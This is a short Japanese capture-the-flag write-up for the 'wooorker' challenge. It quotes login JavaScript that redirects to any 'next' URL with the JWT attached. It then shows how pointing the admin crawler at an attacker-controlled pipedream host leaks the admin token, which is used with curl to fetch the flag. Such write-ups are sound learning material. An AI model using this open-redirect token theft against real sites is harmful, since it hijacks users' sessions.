# writeup
ソースコードを読み、クローラーがあることを考慮すると`admin`のJWTを窃取する問題であることがわかる。

`main.js`ではログイン後にJWTを受け取るが、クエリに`next`パラメータが含まれており、かつ値に`token=`が含まれない場合に`next`に指定したURLにリダイレクトを行う処理になっている。

```:js
const loginWorker = new Worker('login.js');

function login() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    loginWorker.postMessage({ username, password });
}

loginWorker.onmessage = function(event) {
    const { token, error } = event.data;
    if (error) {
        document.getElementById('errorContainer').innerText = error;
        return;
    }
    if (token) {
        const params = new URLSearchParams(window.location.search);
        const next = params.get('next');

        if (next) {
            window.location.href = next.includes('token=') ? next: `${next}?token=${token}`;
        } else {
            window.location.href = `/?token=${token}`;
        }
    }
};
```

そして、リダイレクト先にはJWTがクエリパラメータ`token`として渡される。

また、クローラーは`login?next=/`を送信すると、`https://wooorker.quals.beginners.seccon.jp/login?next=/`を踏んで`admin`としてログインする仕様であるため、`login?next=https://[yours].m.pipedream.net`を送信することで`admin`のJWTが得られる。

最後に取得したJWTを送信することでflagが得られる。

```
curl -H "Authorization: Bearer [admin JWT]" https://wooorker.quals.beginners.seccon.jp/flag
{"flag":"ctf4b{0p3n_r3d1r3c7_m4k35_70k3n_l34k3d}"}
```